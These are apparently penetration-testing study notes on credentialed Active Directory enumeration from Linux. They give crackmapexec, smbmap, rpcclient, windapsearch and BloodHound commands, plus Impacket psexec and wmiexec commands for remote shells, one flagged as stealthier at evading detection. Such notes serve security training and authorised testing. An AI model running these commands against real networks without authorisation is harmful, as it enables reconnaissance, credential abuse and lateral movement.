# Initial Domain Enumeration

For credentialed enumeration, we must have a user's cleartext password, NTLM 
password hash, or SYSTEM access on a domain-joined host.

Once we have any of the above, we should start enumerating domain. We are 
interested in domain users and computers attributes, group membership,
Group Policy Objects, permissions, ACLs, trusts and more.


## From Linux

- Enumeration using `crackmapexec` and `smbmap`:

 ```shell
 # getting password policy
 crackmapexec smb $DC_IP -u username -p password --pass-pol

 # getting usernames
 crackmapexec smb $DC_IP -u username -p password --users

 # getting groups
 crackmapexec smb $DC_IP -u username -p password --groups

 # getting loggin in users on a machine
 crackmapexec smb $MACHINE_IP -u username -p password --loggedon-users

 # getting shares info
 crackmapexec smb $MACHINE_IP -u username -p password --shares
 # getting list of readable files on a share
 # results at /tmp/cme_spider_plus/<ip of host>
 crackmapexec smb $MACHINE_IP -u username -p password -M spider_plus --share $SHARE_NAME

 # getting shares info using SMBMap
 smbmap -u username -p password -d $DOMAIN -H $MACHINE_IP
 # Recursive list of all directories
 smbmap -u username -p password -d $DOMAIN -H $MACHINE_IP -R $SHARE_NAME --dir-only
 ```

- Enumeration using `rpcclient`:

Note: 
- A Relative Identifier (RID) is a unique identifier (represented in hexadecimal format)
 utilized by Windows to track and identify objects.
- When an object is created within a domain, SID will be combined with a RID (RID at end) 
to make a unique value used to represent the object.
- RID is unique for object only within its domain.
- The built-in Administrator account will always have the RID value Hex 0x1f4, or 500.

 ```shell
 # staring a session. you can also try getting NULL session
 rpcclient -U "$u%$Password" $DC_IP

 # getting users and their RIDs
 rpcclient $> enumdomusers

 # getting user info using RID
 rpcclient $> queryuser 0x457
 ```

- Enumeration using Impacket Toolkit

 ```shell
 # psexec creates a remote service by uploading an executable to the ADMIN$ share
 # on the target. It then registers the service via RPC and the Windows Service Control
 # Manager. Once established, communication happens over a named pipe, providing shell
 # as SYSTEM (if you have local admin privs).
 psexec.py $DOMAIN/username:'password'@$DC_IP

 # Wmiexec.py utilizes Windows Management Instrumentation and provides semi-interactive
 # shell. It is stealthy (preferred). Each command will execute a new cmd.exe from WMI
 # event ID 4688: A new process has been created, may catch it
 # runs in the context of user
 wmiexec.py $DOMAIN/username:'password'@$DC_IP
 ```

- Automating search using `Windapsearch ` and `Bloodhound`:

 ```shell
 # getting domain admins
 python3 windapsearch.py --dc-ip $DC_IP -u username@$DOMAIN -p password --da
 # getting privileged users
 python3 windapsearch.py --dc-ip $DC_IP -u username@$DOMAIN -p password -PU

 # gathering domaion information using BloodHound and upload to UI
 bloodhound-python -u 'username' -p 'password' -ns $DC_IP -d $DOMAIN -c all --zip domain.zip

 ```

- A handy cheatsheet: https://wadcoms.github.io/
